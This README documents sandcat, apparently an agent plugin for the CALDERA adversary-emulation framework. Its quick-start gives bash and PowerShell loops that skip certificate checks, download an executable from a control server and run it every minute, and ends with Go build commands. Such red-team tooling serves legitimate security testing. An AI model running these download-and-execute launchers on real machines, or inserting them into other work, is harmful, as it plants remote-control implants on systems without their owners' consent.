# 54ndc47

This plugin contains:
* A custom in-memory agent, with variants for Windows, Linux and MacOSX
* API endpoints for the agent to communicate to CALDERA over HTTPS

## Quick start

Start the agent on a Linux or OSX box with the bash command below
```
while true; do curl -sk -X POST -H 'file:sandcat-osx' https://localhost:8888/file/download > /tmp/sandcat-osx && chmod +x /tmp/sandcat-osx && /tmp/sandcat-osx https://localhost:8888 my_group; sleep 60; done
```

Similarly, you can start the agent on Windows machine with the following:
```
while($true) {[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$url="https://localhost:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("file","sandcat.exe");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe https://localhost:8888 my_group; sleep 60}
```

## Updates

Make a change to the sandcat.go code? Run one of the following to recompile, then put the resulting sandcat file in the
stockpile plugin payloads directory
```
GOOS=windows go build -ldflags="-s -w" sandcat.go
GOOS=linux go build -ldflags="-s -w" sandcat.go
GOOS=darwin go build -ldflags="-s -w" sandcat.go
```